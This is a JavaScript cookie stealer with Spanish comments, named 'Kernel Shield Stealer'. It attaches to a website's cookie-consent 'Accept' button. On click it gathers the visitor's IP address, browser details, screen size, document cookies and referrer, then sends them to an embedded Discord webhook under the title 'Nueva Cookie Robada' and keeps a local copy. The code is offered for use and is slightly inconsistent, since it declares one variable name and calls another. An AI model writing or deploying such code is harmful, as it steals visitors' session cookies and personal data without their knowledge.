const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/https://discord.com/api/webhooks/1556612161101373560/1L8YmVpZcSKSDVxPAWIzQYdM7rPjpo114xqghJbgsPaXhGt5wsEtDDXBa_Y7o9LJuMfZ'; 

// Función para obtener IP del usuario (usando un servicio público permitido por tu CSP o similar)
async function getIP() {
    try {
        // Usamos ipify.org, asegúrate de que esté en tu CSP o usa uno alternativo como api.ip.sb
        const res = await fetch('https://api.ipify.org?format=json');
        return (await res.json()).ip;
    } catch (e) {
        return 'Unknown';
    }
}

// Función para enviar a Discord
async function sendToDiscord(data) {
    if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === "TU_ID_AQUI") return;

    const payload = {
        embeds: [{
            title: "🍪 Nueva Cookie Robada",
            color: 0x673DE6, // Tu color morado
            fields: [
                { name: "🌐 IP", value: data.ip || "N/A" },
                { name: "💻 Navegador/SO", value: data.userAgent || "N/A" },
                { name: "📺 Resolución", value: data.screenRes || "N/A" },
                { name: "🔑 Cookies", value: data.cookies ? data.cookies.substring(0, 500) + (data.cookies.length > 500 ? "..." : "") : "N/A" },
                { name: "🕒 Hora", value: new Date().toLocaleString() },
                { name: "🔗 Referrer", value: data.referrer || "Directo" }
            ],
            footer: { text: "Kernel Shield Stealer" },
            timestamp: new Date().toISOString()
        }]
    };

    try {
        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    } catch (e) {
        console.error("Error enviando a Discord:", e);
    }
}

// Función principal
async function stealAndNotify() {
    const ip = await getIP();
    const userData = {
        ip: ip,
        userAgent: navigator.userAgent,
        screenRes: window.screen.width + 'x' + window.screen.height,
        cookies: document.cookie.substring(0, 500),
        timestamp: new Date().toISOString(),
        referrer: document.referrer
    };

    // Enviamos a Discord
    sendToDiscord(userData);
    
    // Opcional: Guardar en localStorage como respaldo local
    let logs = JSON.parse(localStorage.getItem('ks_logs') || '[]');
    logs.push(userData);
    localStorage.setItem('ks_logs', JSON.stringify(logs));
}

// Detectar clic en "Aceptar"
document.addEventListener('DOMContentLoaded', () => {
    const btn = document.getElementById('cookieAccept');
    if(btn) {
        btn.addEventListener('click', () => {
            console.log("Cookies accepted. Data stolen.");
            stealAndNotify();
        });
    }
});
